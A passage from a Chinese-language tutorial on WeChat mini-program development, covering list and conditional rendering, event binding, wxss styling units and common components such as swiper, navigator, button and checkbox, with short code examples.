id="2.3-列表渲染">2.3 列表渲染<a title="#2.3-列表渲染" href="#2.3-列表渲染"></a></h3><h4 id="2.3.1-列表循环">2.3.1 列表循环<a title="#2.3.1-列表循环" href="#2.3.1-列表循环"></a></h4><ol><li><p>wx:for=“”</p><p>wx:for-item=“循环项name”</p><p>wx:for-index=“循环项索引”</p></li><li><p>wx:key=“唯一的值”  -&gt; 为了提高列表性能</p><p>wx:key=“*this”        -&gt; 表示你的数组是一个普通数组[]  *this表示循环项</p></li><li><p>出现循环嵌套 以下绑定名称 不能重名</p><p>wx:for-item=“item” wx:for-index=“index”</p></li><li><p>默认情况下（一层循环）不用写</p><p>wx:for-item=“item” wx:for-index=“index”</p></li></ol><h4 id="2.3.2-对象循环">2.3.2 对象循环<a title="#2.3.2-对象循环" href="#2.3.2-对象循环"></a></h4><ol><li><p>wx:for=“<code>&#123;&#123;` 数组或者对象 `&#125;&#125;</code>”</p><p>wx:for-item=“对象的值”</p><p>wx:for-index=“对象的键”</p></li><li><p>最好把 item index 的名称 修改下 item,index =&gt; value,key</p></li><li><p>wx:key=“对象的任何一个属性”</p></li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//demo01.js</span></span><br><span class="line"><span class="title class_">Page</span>(&#123;</span><br><span class="line"> <span class="attr">data</span>: &#123;</span><br><span class="line">     ...</span><br><span class="line">    <span class="attr">person</span>: &#123;</span><br><span class="line">      <span class="attr">id</span>: <span class="number">123</span>,</span><br><span class="line">      <span class="attr">name</span>: <span class="string">&#x27;富婆&#x27;</span>,</span><br><span class="line">      <span class="attr">height</span>: <span class="string">&#x27;166&#x27;</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">list</span>: [</span><br><span class="line">      &#123; <span class="attr">id</span>: <span class="number">0</span>, <span class="attr">name</span>: <span class="string">&#x27;zero&#x27;</span> &#125;,</span><br><span class="line">      &#123; <span class="attr">id</span>: <span class="number">1</span>, <span class="attr">name</span>: <span class="string">&#x27;one&#x27;</span> &#125;,</span><br><span class="line">      &#123; <span class="attr">id</span>: <span class="number">2</span>, <span class="attr">name</span>: <span class="string">&#x27;two&#x27;</span> &#125;</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">  &#125;,</span><br><span class="line">&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">  ----列表循环 wx:for-------</span><br><span class="line">  </span><br><span class="line"><span class="tag">&lt;<span class="name">view</span> <span class="attr">wx:for</span>=<span class="string">&quot;&#123;&#123;list&#125;&#125;&quot;</span> <span class="attr">wx:for-item</span>=<span class="string">&quot;item&quot;</span> <span class="attr">wx:for-index</span>=<span class="string">&quot;index&quot;</span> <span class="attr">wx:key</span>=<span class="string">&quot;id&quot;</span>&gt;</span></span><br><span class="line">  索引:&#123;&#123;index&#125;&#125;</span><br><span class="line">  ----</span><br><span class="line">  值:&#123;&#123;item.name&#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  ----对象循环 wx:for-------</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">view</span> <span class="attr">wx:for</span>=<span class="string">&quot;&#123;&#123;person&#125;&#125;&quot;</span> <span class="attr">wx:for-item</span>=<span class="string">&quot;value&quot;</span> <span class="attr">wx:for-index</span>=<span class="string">&quot;key&quot;</span> <span class="attr">wx:key</span>=<span class="string">&quot;id&quot;</span>&gt;</span></span><br><span class="line">  属性:&#123;&#123;key&#125;&#125;</span><br><span class="line">  ----</span><br><span class="line">  值:&#123;&#123;value&#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="2.3.3-block-标签">2.3.3 block 标签<a title="#2.3.3-block-标签" href="#2.3.3-block-标签"></a></h4><p>相当于一个占位符</p><p>写代码的时候 会有</p><p>页面运行后 这个标签直接不存在</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">block</span> <span class="attr">wx:for</span>=<span class="string">&quot;&#123;&#123;person&#125;&#125;&quot;</span> <span class="attr">wx:for-item</span>=<span class="string">&quot;value&quot;</span> <span class="attr">wx:for-index</span>=<span class="string">&quot;key&quot;</span> <span class="attr">wx:key</span>=<span class="string">&quot;id&quot;</span>&gt;</span></span><br><span class="line">  属性:&#123;&#123;key&#125;&#125;</span><br><span class="line">  ----</span><br><span class="line">  值:&#123;&#123;value&#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line"></span><br><span class="line">==&gt;</span><br><span class="line"></span><br><span class="line">属性:id ---- 值:123 属性:name ---- 值:富婆 属性:height ---- 值:166</span><br></pre></td></tr></table></figure><h3 id="2.4-条件渲染">2.4 条件渲染<a title="#2.4-条件渲染" href="#2.4-条件渲染"></a></h3><ol><li><p>wx:if=“<code>&#123;&#123;`true/false`&#125;&#125;</code>”    <font color='red'>使用添加删除元素</font></p></li><li><p>三选一</p><p>wx:if=“<code>&#123;&#123;&#125;&#125;`”   wx:elif=“`&#123;&#123;&#125;&#125;</code>”</p><p>wx:else</p></li><li><p>hidden     <font color='red'>使用display:none</font></p><p>在标签直接加入</p><p>hidden=“<code>&#123;&#123;`true`&#125;&#125;</code>”</p></li></ol><blockquote><p>if 不是频繁切换显示 使用 wx:if    使用添加删除元素</p><p>if 频繁切换 使用hidden                使用display:none       所以使用hidden 不要用 display属性</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> <span class="tag">&lt;<span class="name">view</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">view</span>&gt;</span>条件渲染<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">view</span> <span class="attr">wx:if</span>=<span class="string">&quot;&#123;&#123;true&#125;&#125;&quot;</span>&gt;</span>if -&gt; true<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line">  </span><br><span class="line">  <span class="tag">&lt;<span class="name">view</span> <span class="attr">wx:if</span>=<span class="string">&quot;&#123;&#123;false&#125;&#125;&quot;</span>&gt;</span>if<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">view</span> <span class="attr">wx:elif</span>=<span class="string">&quot;&#123;&#123;true&#125;&#125;&quot;</span>&gt;</span>elif<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">view</span> <span class="attr">wx:else</span>&gt;</span>else<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line">   </span><br><span class="line">   <span class="tag">&lt;<span class="name">view</span> <span class="attr">hidden</span>&gt;</span>hidden1<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">view</span> <span class="attr">hidden</span>=<span class="string">&quot;&#123;&#123;true&#125;&#125;&quot;</span>&gt;</span>hidden -&gt; true<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">view</span> <span class="attr">hidden</span>=<span class="string">&quot;&#123;&#123;false&#125;&#125;&quot;</span>&gt;</span>hidden -&gt; false<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="3.事件绑定">3.事件绑定<a title="#3.事件绑定" href="#3.事件绑定"></a></h2><h3 id="3.1-input双向绑定">3.1 input双向绑定<a title="#3.1-input双向绑定" href="#3.1-input双向绑定"></a></h3><ol><li>给input标签绑定input事件 绑定关键子 bindinput</li><li>通过事件源e 获取输入框的值 e.detail.value</li><li>使用 this.setData({ num:e.detail.value }) 绑定数据的值</li></ol><h3 id="3.2-button-点击事件">3.2 button 点击事件<a title="#3.2-button-点击事件" href="#3.2-button-点击事件"></a></h3><ol><li>点击事件 绑定关键字 bindtap</li><li>不能在事件中 (1) 传参  要使用data-自定义属性传</li><li>使用事件源e 中获取dataset中的值 获取参数</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">bindinput</span>=<span class="string">&quot;handleInput&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">bindtap</span>=<span class="string">&quot;handletap&quot;</span> <span class="attr">data-num</span>=<span class="string">&quot;&#123;&#123;1&#125;&#125;&quot;</span> &gt;</span>+<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">bindtap</span>=<span class="string">&quot;handletap&quot;</span> <span class="attr">data-num</span>=<span class="string">&quot;&#123;&#123;-1&#125;&#125;&quot;</span> &gt;</span>-<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">view</span>&gt;</span></span><br><span class="line">  &#123;&#123;num&#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Page</span>(&#123;</span><br><span class="line">  <span class="attr">data</span>: &#123;</span><br><span class="line">    <span class="attr">num</span>: <span class="number">0</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">//输入框input事件的执行逻辑</span></span><br><span class="line">  <span class="title function_">handleInput</span>(<span class="params">e</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">setData</span>(&#123;</span><br><span class="line">      <span class="attr">num</span>: e.<span class="property">detail</span>.<span class="property">value</span></span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">//加减按钮的事件</span></span><br><span class="line">  <span class="title function_">handletap</span>(<span class="params">e</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">setData</span>(&#123;</span><br><span class="line">      <span class="attr">num</span>: <span class="variable language_">this</span>.<span class="property">data</span>.<span class="property">num</span> + e.<span class="property">currentTarget</span>.<span class="property">dataset</span>.<span class="property">num</span></span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h2 id="4.-wxss样式">4. wxss样式<a title="#4.-wxss样式" href="#4.-wxss样式"></a></h2><h3 id="4.1-尺寸单位">4.1 尺寸单位<a title="#4.1-尺寸单位" href="#4.1-尺寸单位"></a></h3><p>rpx（responsive pixel）: 可以根据屏幕宽度进行自适应。规定屏幕宽为750rpx。</p><blockquote><p>if 在 iPhone6 上，屏幕宽度为375px，共有750个物理像素，则750rpx = 375px = 750物理像素，1rpx = 0.5px = 1物理像素。</p></blockquote><blockquote><p>if 存在这样一个需求 设计稿 page 宽 ， 存在一个元素 100px 宽  要求页面适配</p><p>page px = 750rpx  =&gt;  1px = 750rpx / page px  =&gt; 100px = 750rpx * 100 / page</p></blockquote><p>在wxss里写的时候 可以 使用calc</p><ul><li>可以使用 + - * / ，% px em rem</li><li>可以混合使用各种单位</li><li>用 + - 时 其前后必有空格，* / 可无 但建议保留</li><li>数字与单位之间不留空格</li></ul><h3 id="4.2-样式导入">4.2 样式导入<a title="#4.2-样式导入" href="#4.2-样式导入"></a></h3><p>使用<code>@import</code>语句可以导入外联样式表，<code>@import</code>后跟需要导入的外联样式表的<strong>相对路径</strong>，用<code>;</code>表示语句结束。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">@import</span> <span class="string">&quot;..wxss&quot;</span> </span><br></pre></td></tr></table></figure><h3 id="4.3-选择器">4.3 选择器<a title="#4.3-选择器" href="#4.3-选择器"></a></h3><p>除了不支持 * 全局选择 ，其他都与 css 一样</p><h3 id="4.4-使用less">4.4 使用less<a title="#4.4-使用less" href="#4.4-使用less"></a></h3><ol><li><p>下载插件 easy less</p></li><li><p>在vs code 的设置中加入如下配置</p></li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;less.compile&quot;</span>:&#123;</span><br><span class="line">    <span class="string">&quot;outExt&quot;</span>:<span class="string">&quot;.wxss&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="3"><li>在编写样式的地方，建立.less文件 正常编辑即可</li></ol><h2 id="5.-常见组件">5. 常见组件<a title="#5.-常见组件" href="#5.-常见组件"></a></h2><p>常用的布局组件</p><p>view，text，rich-text，button，image，navigator，icon，swiper，radio，checkbox，等</p><h3 id="5.1-view">5.1 view<a title="#5.1-view" href="#5.1-view"></a></h3><p><a href="https://developers.weixin.qq.com/miniprogram/dev/component/view.html" target="_blank">官方</a>属性</p><div class="φbq"><div class="φbs"><table><thead><tr><th style="text-align:left">属性</th><th style="text-align:left">类型</th><th style="text-align:left">默认值</th><th style="text-align:left">必填</th><th style="text-align:left">说明</th><th style="text-align:left">最低版本</th></tr></thead><tbody><tr><td style="text-align:left">hover-class</td><td style="text-align:left">string</td><td style="text-align:left">none</td><td style="text-align:left">否</td><td style="text-align:left">指定按下去的样式类。当 <code>hover-class=&quot;none&quot;</code> 时，没有点击态效果</td><td style="text-align:left"><a href="https://developers.weixin.qq.com/miniprogram/dev/framework/compatibility.html" target="_blank">1.0.0</a></td></tr><tr><td style="text-align:left">hover-stop-propagation</td><td style="text-align:left">boolean</td><td style="text-align:left">false</td><td style="text-align:left">否</td><td style="text-align:left">指定是否阻止本节点的祖先节点出现点击态</td><td style="text-align:left"><a href="https://developers.weixin.qq.com/miniprogram/dev/framework/compatibility.html" target="_blank">1.5.0</a></td></tr><tr><td style="text-align:left">hover-start-time</td><td style="text-align:left">number</td><td style="text-align:left">50</td><td style="text-align:left">否</td><td style="text-align:left">按住后多久出现点击态，单位毫秒</td><td style="text-align:left"><a href="https://developers.weixin.qq.com/miniprogram/dev/framework/compatibility.html" target="_blank">1.0.0</a></td></tr><tr><td style="text-align:left">hover-stay-time</td><td style="text-align:left">number</td><td style="text-align:left">400</td><td style="text-align:left">否</td><td style="text-align:left">手指松开后点击态保留时间，单位毫秒</td><td style="text-align:left"><a href="https://developers.weixin.qq.com/miniprogram/dev/framework/compatibility.html" target="_blank">1.0.0</a></td></tr></tbody></table></div></div><h3 id="5.2-text">5.2 text<a title="#5.2-text" href="#5.2-text"></a></h3><ul><li>文本标签</li><li>只能嵌套text</li><li>只有这个标签 可以长按文字复制   selectable</li><li>可以对空格 回车 进行编码            decode      (if没有的话 像<code>&amp;nbsp;</code>这种符号会原样显示)</li></ul><blockquote><p>decode可以解析的有<code>&amp;nbsp; &amp;gt; &amp;amp; &amp;apos; &amp;ensp; &amp;emsp;</code></p></blockquote><h3 id="5.3-image">5.3 image<a title="#5.3-image" href="#5.3-image"></a></h3><ul><li>因为后期打包上线 不能超过2兆</li></ul><p>​       所以会把很多 静态资源放在网络上 [软件：图床 将本地图片 放到网络上]</p><ul><li>image组件默认宽度320px、高度240px</li><li>可以直接设置懒加载</li></ul><p>属性：</p><div class="φbq"><div class="φbs"><table><thead><tr><th style="text-align:left">属性</th><th style="text-align:left">类型</th><th style="text-align:left">默认值</th><th style="text-align:left">必填</th><th style="text-align:left">说明</th><th style="text-align:left">最低版本</th></tr></thead><tbody><tr><td style="text-align:left">src</td><td style="text-align:left">string</td><td style="text-align:left"></td><td style="text-align:left">否</td><td style="text-align:left">图片资源地址</td><td style="text-align:left"><a href="https://developers.weixin.qq.com/miniprogram/dev/framework/compatibility.html" target="_blank">1.0.0</a></td></tr><tr><td style="text-align:left">mode</td><td style="text-align:left">string</td><td style="text-align:left">scaleToFill</td><td style="text-align:left">否</td><td style="text-align:left">图片裁剪、缩放的模式</td><td style="text-align:left"><a href="https://developers.weixin.qq.com/miniprogram/dev/framework/compatibility.html" target="_blank">1.0.0</a></td></tr><tr><td style="text-align:left">lazy-load</td><td style="text-align:left">boolean</td><td style="text-align:left">false</td><td style="text-align:left">否</td><td style="text-align:left">图片懒加载，在即将进入一定范围（上下三屏）时才开始加载</td><td style="text-align:left"><a href="https://developers.weixin.qq.com/miniprogram/dev/framework/compatibility.html" target="_blank">1.5.0 </a></td></tr></tbody></table></div></div><p>mode属性的值：</p><ul><li>scaleToFill ： 默认，不保持宽高比，使图片的宽高完全拉伸至填满</li><li>aspectFit ：常用，保持宽高比，使图片的长边能完全显示出来</li><li>aspectFill ：少用，保持宽高比，使图片的短边能完全显示出来</li><li>widthFix ：常用，保持宽高比，宽度不变，高度自动变化</li><li>heightFix ： 保持宽高比，高度不变，宽度自动变化</li><li>top、bottom、center、left、right、top left、top right、bottom left、bottom right ： 不缩放图片，只显示图片的…区域（相当于background-position）</li></ul><h3 id="5.4-swiper-轮播图">5.4 swiper 轮播图<a title="#5.4-swiper-轮播图" href="#5.4-swiper-轮播图"></a></h3><ul><li>swiper(轮播图外层容器) &gt; swiper-item (轮播项)</li><li>swiper存在默认宽(100%)高(150px)  如果里面要用到image也是有默认宽高的(320px * 240px) swiper不会被里面撑开</li><li>要计算swiper 和 image 的宽高</li><li>属性：<ul><li>autoplay 自动播放</li><li>interval 轮播时间 ms</li><li>circular 循环轮播</li><li>indicator-dots 显示 指示器/分页器/索引器</li><li>indicator-color 指示器未选中颜色</li><li>indicator-active-color 指示器选中颜色</li></ul></li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 先找出 原图的宽高 等比例 给swiper 定宽高</span></span><br><span class="line"><span class="comment">原图 520 * 280px </span></span><br><span class="line"><span class="comment">swiper 宽 / 高 = 原图 宽 / 高</span></span><br><span class="line"><span class="comment">height: swiper 宽 * 原图 高 / 宽 = 100vw * 280px / 520px --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">swiper</span> <span class="attr">autoplay</span> <span class="attr">interval</span>=<span class="string">&quot;2000&quot;</span> <span class="attr">circular</span> <span class="attr">indicator-dots</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">swiper-item</span>&gt;</span> <span class="tag">&lt;<span class="name">image</span> <span class="attr">mode</span>=<span class="string">&quot;widthFix&quot;</span> <span class="attr">src</span>=<span class="string">&quot;...&quot;</span> /&gt;</span><span class="tag">&lt;/<span class="name">swiper-item</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">swiper-item</span>&gt;</span> <span class="tag">&lt;<span class="name">image</span> <span class="attr">mode</span>=<span class="string">&quot;widthFix&quot;</span> <span class="attr">src</span>=<span class="string">&quot;...&quot;</span> /&gt;</span><span class="tag">&lt;/<span class="name">swiper-item</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">swiper-item</span>&gt;</span> <span class="tag">&lt;<span class="name">image</span> <span class="attr">mode</span>=<span class="string">&quot;widthFix&quot;</span> <span class="attr">src</span>=<span class="string">&quot;...&quot;</span> /&gt;</span><span class="tag">&lt;/<span class="name">swiper-item</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">swiper</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">swiper&#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="built_in">calc</span>(<span class="number">100vw</span> * <span class="number">280</span> / <span class="number">520</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">image&#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="5.5-navigator-超链接">5.5 navigator 超链接<a title="#5.5-navigator-超链接" href="#5.5-navigator-超链接"></a></h3><p>导航组件 navigator  块级标签</p><p>属性：</p><ul><li>url：当前小程序内的跳转链接</li><li>targer：在哪个目标上发生跳转，默认当前小程序 self(自己 默认) / miniProgram(其他小程序)</li><li>open-type：跳转方式<ul><li>navigate：默认，保留当前页面，跳转应用内某页面，不能跳转tabbar页面</li><li>redirect：关闭当前页面，跳转应用内某页面，不能跳转tabbar页面</li><li>switchTab：跳转tabBar页面，并关闭其他所有页面</li><li>reLaunch：关闭所有页面，打开到应用内某页面</li><li>navigateBack：关闭当前页面，返回上一页面，可通过getCurrentPages()获取当前页面栈</li><li>exit：退出小程序，target=”miniProgram”时使用</li></ul></li></ul><h3 id="5.6-rich-text-富文本">5.6 rich-text <a href="https://developers.weixin.qq.com/miniprogram/dev/component/rich-text.html">富文本</a><a title="#5.6-rich-text-富文本" href="#5.6-rich-text-富文本"></a></h3><p>相当于v-html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">rich-text</span> <span class="attr">nodes</span>=<span class="string">&quot;&#123;&#123;html&#125;&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">rich-text</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Page</span>(&#123;</span><br><span class="line">    <span class="attr">data</span>:&#123;</span><br><span class="line">        <span class="comment">//1. 字符串 &lt;div&gt;hello&lt;/div&gt;</span></span><br><span class="line">        <span class="attr">html</span>:<span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="comment">//2. 对象形式</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h3 id="5.7-button">5.7 button<a title="#5.7-button" href="#5.7-button"></a></h3><h4 id="5.7.1-外观属性">5.7.1 外观属性<a title="#5.7.1-外观属性" href="#5.7.1-外观属性"></a></h4><p><a href="https://developers.weixin.qq.com/miniprogram/dev/component/button.html" target="_blank">官网</a></p><ul><li><p>size 尺寸：default(默认) / mini(小尺寸)</p></li><li><p>type 颜色：default(灰色) / primary(绿色) / warn(红色)</p></li><li><p>plain 背景透明</p></li><li><p>loading 文字前面 + 加载logo</p></li><li><p>open-type 开发功能 ：…</p></li></ul><h4 id="5.7.2-开放功能">5.7.2 开放功能<a title="#5.7.2-开放功能" href="#5.7.2-开放功能"></a></h4><ul><li>open-type 的值：<ul><li>contact 打开客服对话  需要在微信小程序的后台配置<ol><li>只能真机调试</li><li>将小程序的appid 由测试号 改为自己的 appid</li><li>登录 微信小程序官网 添加 客服-微信</li><li></li></ol></li><li>share 转发当前小程序到微信朋友  不能发到朋友圈</li><li>getPhoneNumber 获取当前用户手机号码信息 结合事件  if非企业小程序 就没有权限获取<ol><li>绑定事件 bindgetpphonenumber</li><li>在回调函数中 通过参数来获取信息 / 事件源e</li><li>获取的信息加密了</li><li>需要用户自己搭建小程序后台服务器 在其解析 返回到小程序才能看到</li></ol></li><li>getUserInfo 获取当前用户的个人信息<ol><li>绑定事件 bindgetuserinfo</li><li>可以获取到</li></ol></li><li>launchApp 在当前小程序 直接打开app<ol><li>需要先在app 中 通过app 打开小程序</li><li>然后在小程序中 点击这个button 才能打开 app</li></ol></li><li>openSetting 打开小程序内置的 授权页面<ol><li>只会出现用户曾经授权过的</li></ol></li><li>feedback 打开小程序内置的 意见反馈页面<ol><li>只能真机调试</li></ol></li></ul></li></ul><h3 id="5.8-icon">5.8 icon<a title="#5.8-icon" href="#5.8-icon"></a></h3><p>属性:</p><ul><li>type：图标类型 success, success_no_circle, info, warn, waiting, cancel, download, search, clear</li><li>size：默认23 ，数值越大 图标越大</li><li>color：与css颜色同</li></ul><h3 id="5.9-radio">5.9 radio<a title="#5.9-radio" href="#5.9-radio"></a></h3><p>radio-group &gt; radio</p><p>可以使用color属性 换颜色</p><p>选择单选框 触发的事件 bindchange</p><p>需求：选择 在页面中显示选择的内容</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">radio-group</span> <span class="attr">bindchange</span>=<span class="string">&quot;handleChange&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">radio</span> <span class="attr">value</span>=<span class="string">&quot;male&quot;</span>&gt;</span>男<span class="tag">&lt;/<span class="name">radio</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">radio</span> <span class="attr">value</span>=<span class="string">&quot;female&quot;</span>&gt;</span>女<span class="tag">&lt;/<span class="name">radio</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">radio-group</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">view</span>&gt;</span>您选择的是：&#123;&#123;gender&#125;&#125; <span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Page</span>(&#123;</span><br><span class="line">    <span class="attr">data</span>:&#123;</span><br><span class="line">        <span class="attr">gender</span>:<span class="string">&quot;&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="title function_">handleChange</span>(<span class="params">e</span>)&#123;</span><br><span class="line">        <span class="keyword">let</span> gender = e.<span class="property">detail</span>.<span class="property">value</span>;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="title function_">setData</span>(&#123;</span><br><span class="line">            gender</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h3 id="5.10-checkbox">5.10 checkbox<a title="#5.10-checkbox" href="#5.10-checkbox"></a></h3><p>checkbok-group &gt; checkbox</p><p>可以使用color属性 换颜色</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">checkbox-group</span> <span class="attr">bindchange</span>=<span class="string">&quot;handleChange&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">checkbox</span> <span class="attr">value</span>=<span class="string">&quot;&#123;&#123;item.value&#125;&#125;&quot;</span> <span class="attr">wx:for</span>=<span class="string">&quot;&#123;&#123;list&#125;&#125;&quot;</span> <span class="attr">wx:key</span>=<span class="string">&quot;id&quot;</span>&gt;</span>&#123;&#123;item.name&#125;&#125;<span class="tag">&lt;/<span class="name">checkbox</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">checkbox-group</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">view</span>&gt;</span>您选择的是：&#123;&#123;checkedlist&#125;&#125; <span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td 